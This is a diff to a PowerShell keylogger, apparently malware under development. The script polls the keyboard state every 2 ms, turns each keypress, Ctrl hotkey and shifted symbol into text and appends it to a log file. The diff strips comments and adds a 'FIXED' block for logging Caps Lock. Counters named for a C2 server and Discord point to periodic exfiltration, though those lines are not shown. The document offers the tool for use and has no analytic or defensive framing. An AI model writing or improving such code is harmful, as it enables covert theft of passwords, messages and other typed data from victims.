@@ -23,7 +23,6 @@ $headers = @{ "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" }
 
 while ($true) {
     # ================= ENGINE A: HIGH-SPEED CHAR-MAPPED KEYLOGGER =================
-    # Query direct keyboard line states simultaneously before stepping through individual loops
     $isShift = (([KeyEngine]::GetAsyncKeyState(16) -band 0x8000) -or ([KeyEngine]::GetAsyncKeyState(160) -band 0x8000) -or ([KeyEngine]::GetAsyncKeyState(161) -band 0x8000))
     $isCtrl  = (([KeyEngine]::GetAsyncKeyState(17) -band 0x8000) -or ([KeyEngine]::GetAsyncKeyState(162) -band 0x8000))
     $isCaps  = ([KeyEngine]::GetAsyncKeyState(20) -band 0x1)
@@ -32,7 +31,6 @@ while ($true) {
         if ([KeyEngine]::GetAsyncKeyState($i) -eq -32767) {
             $keyText = ""
 
-            # Explicit hotkey intercept loops
             if ($isCtrl -and $i -ne 17) {
                 if ($i -ge 65 -and $i -le 90) { $keyText = " [CTRL+" + [char]$i + "] " }
                 else { $keyText = " [CTRL+$i] " }
@@ -44,23 +42,25 @@ while ($true) {
                 8   { $keyText = " [BACKSPACE] " }
                 9   { $keyText = " [TAB] " }
                 13  { $keyText = "`n" }
-                16  { continue } # Skip standard layout modifier logging
+                16  { continue } 
                 17  { continue }
                 18  { $keyText = " [ALT] " }
-                20  { $keyText = " [CAPS] " }
+                # FIXED: Added try-catch writing block and explicit continue to log Caps safely without overlap
+                20  { 
+                    $keyText = " [CAPS] " 
+                    try { $keyText | Out-File $logFile -Append -NoNewline -ErrorAction SilentlyContinue } catch {}
+                    continue
+                }
                 27  { $keyText = " [ESC] " }
                 32  { $keyText = " " }
                 46  { $keyText = " [DEL] " }
                 
-                # Direct English Letter Mapping (Bypasses ToUnicode limitations)
                 { $_ -ge 65 -and $_ -le 90 } {
                     $letter = [char]$i
-                    # Determine true state based on Shift and Caps Lock interaction
                     if ($isShift -xor $isCaps) { $keyText = $letter.ToString().ToUpper() }
                     else { $keyText = $letter.ToString().ToLower() }
                 }
 
-                # Direct Standard Number Line & Shifted Symbol Array Maps
                 48  { $keyText = if ($isShift) { ")" } else { "0" } }
                 49  { $keyText = if ($isShift) { "!" } else { "1" } }
                 50  { $keyText = if ($isShift) { "@" } else { "2" } }
@@ -72,7 +72,6 @@ while ($true) {
                 56  { $keyText = if ($isShift) { "*" } else { "8" } }
                 57  { $keyText = if ($isShift) { "(" } else { "9" } }
 
-                # Punctuation Mapping Matrix
                 186 { $keyText = if ($isShift) { ":" } else { ";" } }
                 187 { $keyText = if ($isShift) { "+" } else { "=" } }
                 188 { $keyText = if ($isShift) { "<" } else { "," } }
@@ -116,7 +115,6 @@ while ($true) {
         $discordInterval = 0
     }
 
-    # Blazing-fast 2ms loop sleep time captures typing at any speed flawlessly
     Start-Sleep -m 2
     $c2Interval += 2
     $discordInterval += 2
